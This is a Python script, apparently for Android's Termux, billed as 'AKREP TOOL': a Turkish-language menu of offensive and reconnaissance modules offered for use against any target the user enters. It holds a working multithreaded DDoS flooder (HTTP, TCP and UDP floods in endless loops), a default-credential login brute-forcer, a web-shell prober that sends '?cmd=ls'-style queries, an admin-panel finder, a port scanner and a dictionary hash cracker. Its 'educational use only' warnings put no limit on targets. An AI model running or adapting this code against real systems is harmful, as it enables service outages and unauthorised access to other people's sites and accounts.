#!/data/data/com.termux/files/usr/bin/python
# AKREP TOOL - Geliştirilmiş Versiyon

import os
import sys
import time
import socket
import random
import requests
import threading
import webbrowser
import subprocess
import hashlib
from datetime import datetime

# Gerekli kütüphaneleri kontrol et ve yükle
def install_requirements():
    try:
        import phonenumbers
    except ImportError:
        os.system('pip install phonenumbers')
    
    try:
        import colorama
    except ImportError:
        os.system('pip install colorama')
    
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        os.system('pip install beautifulsoup4')

install_requirements()

# Renkler ve Simgeler
green = "\033[1;32m"
red = "\033[1;31m"
white = "\033[1;37m"
blue = "\033[1;34m"
yellow = "\033[1;33m"
purple = "\033[1;35m"
cyan = "\033[1;36m"
reset = "\033[0m"
info, success, fail = f"{blue}[*]{reset} ", f"{green}[+]{reset} ", f"{red}[-]{reset} "

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
]

def clear(): 
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""{green}
⣲⣶⠒⠷⠶⠤⠴⠦⠤⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣶⠚⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⢌⣛⠶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠠⢚⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⡄⠙⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀       ⠀⢀⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣀⠀⣀⣤⣧⠔⠛⠓⠲⠤⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⢐⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣤⣄⣠⣤⣴⣾⣿⣿⣾⡗⠀⢀⣀⢤⠐⠠⠤⣉⠓⠦⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀        ⢀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠒⠶⠶⢾⣿⡿⠛⢻⣻⠛⢻⣿⣿⠟⣋⣺⣿⠏⠀⠴⠿⠹⠋⠀⠀⠀⠀⠈⠀⠨⠳⣄⠀⠀
⠀⠀⠀⠀⠀        ⠀⠀⢐⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⠤⠄⠐⢾⣿⣝⠤⣀⢀⡠⣱⣿⣿⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀
⠀⠀⠀⠀⠀        ⠀⢠⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢉⣛⣺⣿⣾⣛⣽⣿⡟⠁⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀
⠀⠀⠀⠀        ⠀⠐⡟⠀⠀⠀⠀⡠⠖⠀⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀⡈⠉⢉⡽⠿⢛⡿⢛⠯⠭⣒⣚⣩⣭⣭⣤⡤⠭⠭⢭⣥⣀⣉⣑⣒⢵⡀⠀⠀⢸⡇
⠀⠀⠀⠀        ⠀⣰⠃⠀⢀⡔⠋⠀⠀⠀⣠⡴⠋⠀⠀⠀⠀⣠⣤⡴⠋⠀⠀⠀⠀⠀⠾⢶⣾⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠳⡀⠀⣸⠃
⠀⠀⠀        ⠀⢰⠟⢀⣴⠏⠀⡀⢀⣴⡿⠋⠀⠀⠀⢀⡴⠟⠋⠁⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣇⠔⠁⠀
⠀⠀⠀        ⠀⣞⣴⣿⠃⢠⣾⣴⣿⠋⠀⠀⠀⠀⠐⠋⠀⠀⠀⠀⠀⢐⣚⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠁⠀⠀⠀
⠀⠀        ⠀⣸⣿⣿⣧⣶⣿⣿⣿⠗⠁⠀⡠⠂⠀⢀⠀⠀⠀⠀⠂⢉⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⡟⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⢀⠼⢻⣿⣿⣿⣿⣿⣿⠁⢀⣴⠏⢀⣠⠞⠁⢀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠱⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⠀⣠⣿⣿⣿⣿⣿⣿⣧⣾⡿⣡⣾⣿⠃⣠⡾⠁⠀⣀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠂⠀⢻⣍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⠈⣽⣿⣿⣿⣿⣿⣿⡟⠉⣰⣿⡿⣡⣾⣿⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢻⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⣠⣿⣿⣿⣿⣿⣿⣿⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣱⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⢸⣾⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠐⠛⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢫⣿⠏⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⡄⠀⣿⣿⡏⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⠀⣾⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣴⡿⢋⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⠀⠁⠀⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀       ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀        ⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀        ⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⢿⡿⠁⣿⠏⠘⢿⣿⣿⣿⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀        ⠀⠀⠀⠿⠋⣿⡿⠋⣸⠟⠁⠀⣾⣿⣿⣿⣿⣿⠟⠁⠈⠀⠀⠹⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠁⠀⠀⠉⠀⠀⠰⠿⣿⣿⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠙⡏⠀⠻⠀
          {white}AYDINLIK İÇİN ÇALIŞANLAR
           Made by AKREP AİÇ
          {blue}GitHub: https://github.com/dixblo-q
          İnstagram: @dixblowashere
          Discord: @tukenecegizz{reset}
    """)

# --- GELİŞTİRİLMİŞ MODÜLLER ---

def admin_finder():
    print(f"\n{info}=== ADMIN PANEL BULUCU ===")
    site = input(f"{info}Hedef URL [https://site.com]: ").strip()
    if not site.startswith('http'):
        site = 'http://' + site
    
    admin_paths = [
        '/admin', '/administrator', '/admin.php', '/login.php', '/wp-admin',
        '/panel', '/cp', '/controlpanel', '/yonetim', '/admin/login',
        '/adminpanel', '/yonetici', '/giris', '/admin/index.php'
    ]
    
    headers = {'User-Agent': random.choice(user_agents)}
    
    print(f"{info}Admin panelleri taranıyor...")
    found = False
    
    for path in admin_paths:
        try:
            url = site + path
            response = requests.get(url, headers=headers, timeout=5, allow_redirects=False)
            
            if response.status_code == 200:
                print(f"{success}Bulundu: {url}")
                found = True
            elif response.status_code in [301, 302]:
                print(f"{yellow}[!]{reset} Yönlendirme: {url} -> {response.headers.get('Location', 'Bilinmiyor')}")
        except requests.exceptions.RequestException:
            continue
    
    if not found:
        print(f"{fail}Admin paneli bulunamadı.")

def admin_bypass():
    print(f"\n{info}=== ADMIN BYPASS DENEMESİ === (Eğitim Amaçlı)")
    url = input(f"{info}Hedef Admin URL: ").strip()
    
    common_creds = [
        ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
        ('admin', '12345'), ('root', 'root'), ('user', 'user'),
        ('admin', 'pass'), ('administrator', 'admin')
    ]
    
    print(f"{info}Deneme yapılıyor...")
    
    for username, password in common_creds:
        try:
            data = {'username': username, 'password': password}
            response = requests.post(url, data=data, timeout=3)
            
            if response.status_code == 200 and "error" not in response.text.lower():
                print(f"{success}Başarılı: {username}:{password}")
                break
        except:
            continue

def ip_geo():
    print(f"\n{info}=== IP GEOLOCATION ===")
    ip = input(f"{info}IP Adresi: ").strip()
    
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        
        if data['status'] == 'success':
            print(f"\n{green}IP Bilgileri:{reset}")
            print(f"{green}├─ IP: {white}{data['query']}")
            print(f"{green}├─ Ülke: {white}{data['country']}")
            print(f"{green}├─ Şehir: {white}{data['city']}")
            print(f"{green}├─ ISP: {white}{data['isp']}")
            print(f"{green}├─ Bölge: {white}{data['regionName']}")
            print(f"{green}├─ Koordinatlar: {white}{data['lat']}, {data['lon']}")
            print(f"{green}└─ Zaman Dilimi: {white}{data['timezone']}")
        else:
            print(f"{fail}IP bulunamadı.")
    except:
        print(f"{fail}API hatası!")

def dns_enum():
    print(f"\n{info}=== DNS ENUMERASYONU ===")
    domain = input(f"{info}Domain: ").strip()
    
    try:
        ip = socket.gethostbyname(domain)
        print(f"{success}IP Adresi: {ip}")
        
        # Reverse DNS
        try:
            host = socket.gethostbyaddr(ip)
            print(f"{success}Reverse DNS: {host[0]}")
        except:
            pass
        
        # NS kayıtları
        try:
            ns_records = subprocess.check_output(['nslookup', '-type=ns', domain], text=True)
            print(f"{success}NS Kayıtları:\n{ns_records}")
        except:
            print(f"{fail}NS kayıtları alınamadı.")
            
    except socket.gaierror:
        print(f"{fail}Domain çözümlenemedi.")

def site_info():
    print(f"\n{info}=== SİTE BİLGİSİ ===")
    target = input(f"{info}Domain: ").strip()
    
    try:
        if not target.startswith('http'):
            target = 'http://' + target
        
        start_time = time.time()
        response = requests.get(target, headers={'User-Agent': random.choice(user_agents)}, timeout=10)
        load_time = time.time() - start_time
        
        print(f"\n{green}Site Bilgileri:{reset}")
        print(f"{green}├─ Durum Kodu: {white}{response.status_code}")
        print(f"{green}├─ Sunucu: {white}{response.headers.get('Server', 'Bilinmiyor')}")
        print(f"{green}├─ Teknoloji: {white}{response.headers.get('X-Powered-By', 'Bilinmiyor')}")
        print(f"{green}├─ İçerik Tipi: {white}{response.headers.get('Content-Type', 'Bilinmiyor')}")
        print(f"{green}├─ Sayfa Boyutu: {white}{len(response.content)} bytes")
        print(f"{green}└─ Yükleme Süresi: {white}{load_time:.2f} saniye")
        
    except requests.exceptions.RequestException as e:
        print(f"{fail}Hata: {e}")

def shell_checker():
    print(f"\n{info}=== SHELL CHECKER ===")
    url = input(f"{info}Shell URL: ").strip()
    
    common_commands = ['?id=1', '?cmd=ls', '?cmd=dir', '?command=ls', '?exec=ls']
    
    for cmd in common_commands:
        try:
            test_url = url + cmd
            response = requests.get(test_url, timeout=5)
            
            if response.status_code == 200 and len(response.text) > 100:
                print(f"{success}Muhtemel shell: {test_url}")
                break
        except:
            continue

def ddos_storm():
    clear()
    print(red + "--- DDoS STORM PANELİ ---" + reset)
    print(f"{yellow}[!] UYARI: Bu modül sadece eğitim amaçlıdır!{reset}")
    print(f"{yellow}[!] İzinsiz kullanımı yasaktır!{reset}")
    
    print(f"\n{green}Metodlar:{reset}")
    print("1-HTTP Flood")
    print("2-TCP Flood")
    print("3-UDP Flood")
    
    choice = input(f"\n{info}Metod > ")
    target = input(f"{info}Hedef IP/Domain: ")
    
    try:
        ip = socket.gethostbyname(target)
        print(f"{success}IP Çözümlendi: {ip}")
    except:
        print(f"{fail}Hedef çözümlenemedi!")
        return
    
    port = int(input(f"{info}Port: "))
    thread_count = int(input(f"{info}Thread Sayısı: "))
    
    def http_flood():
        headers = {'User-Agent': random.choice(user_agents)}
        while True:
            try:
                requests.get(f"http://{ip}:{port}", headers=headers, timeout=1)
            except:
                pass
    
    def udp_flood():
        data = random._urandom(1024)
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (ip, port))
            except:
                pass
    
    def tcp_flood():
        data = random._urandom(1024)
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.send(data)
                sock.close()
            except:
                pass
    
    flood_func = http_flood if choice == "1" else udp_flood if choice == "3" else tcp_flood
    
    print(f"{red}Saldırı başlatılıyor... (Durdurmak için Ctrl+C){reset}")
    
    for _ in range(thread_count):
        threading.Thread(target=flood_func, daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{yellow}Saldırı durduruldu.{reset}")

def reverse_ip():
    print(f"\n{info}=== REVERSE IP ===")
    ip = input(f"{info}IP Adresi: ").strip()
    
    try:
        response = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=10)
        if response.text and "error" not in response.text.lower():
            print(f"{success}Aynı IP'deki siteler:")
            print(response.text)
        else:
            print(f"{fail}Sonuç bulunamadı.")
    except:
        print(f"{fail}API hatası!")

def vuln_scanner():
    print(f"\n{info}=== ZAFİYET TARAYICI ===")
    url = input(f"{info}Hedef URL: ").strip()
    
    if not url.startswith('http'):
        url = 'http://' + url
    
    vulnerabilities = [
        ('/phpinfo.php', 'PHP Bilgi'),
        ('/test.php', 'Test Sayfası'),
        ('/backup.zip', 'Yedek Dosyası'),
        ('/.git/', 'Git Dizini'),
        ('/wp-config.php.bak', 'WP Config Yedek')
    ]
    
    print(f"{info}Taranıyor...")
    
    for path, vuln_type in vulnerabilities:
        try:
            test_url = url + path
            response = requests.get(test_url, timeout=3)
            
            if response.status_code == 200:
                print(f"{yellow}[!]{reset} Potansiyel risk: {vuln_type} -> {test_url}")
        except:
            continue

def dork_search():
    print(f"\n{info}=== GOOGLE DORK ARAMA ===")
    dork = input(f"{info}Arama terimi (dork): ").strip()
    
    print(f"\n{green}Google dork linkleri:{reset}")
    print(f"https://www.google.com/search?q={dork.replace(' ', '+')}")
    print(f"https://www.bing.com/search?q={dork.replace(' ', '+')}")
    
    open_browser = input(f"\n{info}Tarayıcıda açılsın mı? (e/h): ")
    if open_browser.lower() == 'e':
        webbrowser.open(f"https://www.google.com/search?q={dork.replace(' ', '+')}")

def redirect_analyzer():
    print(f"\n{info}=== YÖNLENDİRME ANALİZİ ===")
    url = input(f"{info}URL: ").strip()
    
    try:
        response = requests.get(url, allow_redirects=True, timeout=5)
        
        print(f"{success}Son URL: {response.url}")
        print(f"{success}Durum Kodu: {response.status_code}")
        
        if response.history:
            print(f"{green}Yönlendirme Zinciri:{reset}")
            for i, resp in enumerate(response.history, 1):
                print(f"  {i}. {resp.url} -> {resp.status_code}")
    except:
        print(f"{fail}Analiz başarısız!")

def header_checker():
    print(f"\n{info}=== HEADER KONTROLÜ ===")
    url = input(f"{info}URL: ").strip()
    
    if not url.startswith('http'):
        url = 'http://' + url
    
    try:
        response = requests.get(url, timeout=5)
        
        print(f"\n{green}HTTP Başlıkları:{reset}")
        important_headers = ['Server', 'X-Powered-By', 'Content-Security-Policy', 
                           'X-Frame-Options', 'X-XSS-Protection']
        
        for header, value in response.headers.items():
            if header in important_headers:
                print(f"{yellow}[!]{reset} {header}: {value}")
            else:
                print(f"  {header}: {value}")
                
    except:
        print(f"{fail}Bağlantı hatası!")

def port_scanner():
    print(f"\n{info}=== PORT TARAYICI ===")
    target = input(f"{info}Hedef IP/Domain: ").strip()
    
    try:
        ip = socket.gethostbyname(target)
        print(f"{success}Hedef IP: {ip}")
    except:
        print(f"{fail}Hedef çözümlenemedi!")
        return
    
    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
    
    print(f"{info}Portlar taranıyor...")
    open_ports = []
    
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                except:
                    service = "bilinmiyor"
                open_ports.append((port, service))
            sock.close()
        except:
            pass
    
    threads = []
    for port in common_ports:
        t = threading.Thread(target=scan_port, args=(port,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    if open_ports:
        print(f"{success}Açık portlar:")
        for port, service in open_ports:
            print(f"  ├─ {port}/tcp - {service}")
    else:
        print(f"{fail}Açık port bulunamadı.")

def hash_cracker():
    print(f"\n{info}=== HASH KIRICI (Basit) ===")
    hash_type = input(f"{info}Hash türü (md5/sha1/sha256): ").lower().strip()
    target_hash = input(f"{info}Hash: ").strip()
    
    common_passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', 
                       '12345', '1234', '111111', '1234567', 'dragon']
    
    print(f"{info}Deneniyor...")
    
    for password in common_passwords:
        if hash_type == 'md5':
            hashed = hashlib.md5(password.encode()).hexdigest()
        elif hash_type == 'sha1':
            hashed = hashlib.sha1(password.encode()).hexdigest()
        elif hash_type == 'sha256':
            hashed = hashlib.sha256(password.encode()).hexdigest()
        else:
            print(f"{fail}Geçersiz hash türü!")
            return
        
        if hashed == target_hash:
            print(f"{success}Hash kırıldı! Şifre: {password}")
            return
    
    print(f"{fail}Şifre bulunamadı.")

def phone_osint():
    print(f"\n{green}--- PHONE NUMBER OSINT ---{reset}")
    
    try:
        import phonenumbers
        from phonenumbers import geocoder, carrier, timezone
        
        num = input(f"{info}Numara (+905xx): ").strip()
        
        try:
            p_num = phonenumbers.parse(num)
            
            if phonenumbers.is_valid_number(p_num):
                print(f"{success}✓ Geçerli numara")
                print(f"{success}Ülke: {geocoder.description_for_number(p_num, 'tr')}")
                print(f"{success}Operatör: {carrier.name_for_number(p_num, 'tr')}")
                print(f"{success}Saat Dilimi: {timezone.time_zones_for_number(p_num)}")
                print(f"{success}Formatlı: {phonenumbers.format_number(p_num, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}")
            else:
                print(f"{fail}Geçersiz numara!")
                
        except:
            print(f"{fail}Numara formatı hatalı!")
            
    except ImportError:
        print(f"{fail}phonenumbers kütüphanesi yüklü değil!")
        install = input(f"{info}Yüklemek ister misiniz? (e/h): ")
        if install.lower() == 'e':
            os.system('pip install phonenumbers')
            print(f"{success}Lütfen tekrar çalıştırın.")

# --- ANA MENÜ ---

def main():
    while True:
        clear()
        banner()
        print(f"""
{green}01{reset}- Admin Finder     {green}06{reset}- Shell Checker    {green}11{reset}- Redirect Analiz
{green}02{reset}- Admin Bypass     {green}07{reset}- DDoS Storm       {green}12{reset}- Header Checker
{green}03{reset}- IP Geolocation   {green}08{reset}- Reverse IP       {green}13{reset}- Port Scanner
{green}04{reset}- DNS Enumeration  {green}09{reset}- Vuln Scanner     {green}14{reset}- Hash Cracker
{green}05{reset}- Site Info        {green}10{reset}- Dork Search      {blue}15{reset}- Phone OSINT
        """)
        print(f"{red}00{reset}- Çıkış")
        
        cmd = input(f"\n{white}Akrep@Termux > {reset}")
        
        if cmd == "1":
            admin_finder()
        elif cmd == "2":
            admin_bypass()
        elif cmd == "3":
            ip_geo()
        elif cmd == "4":
            dns_enum()
        elif cmd == "5":
            site_info()
        elif cmd == "6":
            shell_checker()
        elif cmd == "7":
            ddos_storm()
        elif cmd == "8":
            reverse_ip()
        elif cmd == "9":
            vuln_scanner()
        elif cmd == "10":
            dork_search()
        elif cmd == "11":
            redirect_analyzer()
        elif cmd == "12":
            header_checker()
        elif cmd == "13":
            port_scanner()
        elif cmd == "14":
            hash_cracker()
        elif cmd == "15":
            phone_osint()
        elif cmd == "00":
            print(f"\n{yellow}Görüşmek üzere!{reset}")
            sys.exit(0)
        else:
            print(f"{fail}Geçersiz seçim!")
        
        input(f"\n{info}Devam etmek için ENTER'a basın...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{yellow}Program sonlandırıldı.{reset}")
        sys.exit(0)
